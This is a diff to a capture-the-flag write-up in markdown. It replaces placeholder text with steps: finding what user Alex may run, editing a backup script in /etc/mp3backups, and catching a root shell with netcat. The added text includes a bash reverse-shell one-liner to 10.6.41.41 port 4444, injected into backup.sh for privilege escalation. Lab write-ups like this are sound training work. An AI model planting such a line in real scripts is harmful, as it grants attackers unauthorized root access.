@@ -111,13 +111,15 @@ Found user.txt
 
 
 
-gesageaae
+Found what Alex allowed to run and went to /etc/mp3backups directory
 
 
 ![image](https://github.com/user-attachments/assets/ad508d45-af19-4c9a-b0f3-9914a473b3db)
 
 
-agaegae
+## Reverse Shell/Privilege Escalation
+
+Modified backup.sh file by adding ```bash -i >& /dev/tcp/10.6.41.41/4444 0>&1```
 
 
 ![image](https://github.com/user-attachments/assets/756bacc0-28d3-4677-b7fd-f360ff6eac1f)
@@ -125,7 +127,7 @@ agaegae
 
 
 
-gageaaewg
+Opened a new tab and set up netcat and successfully got a reverse shell to root!
 
 
 
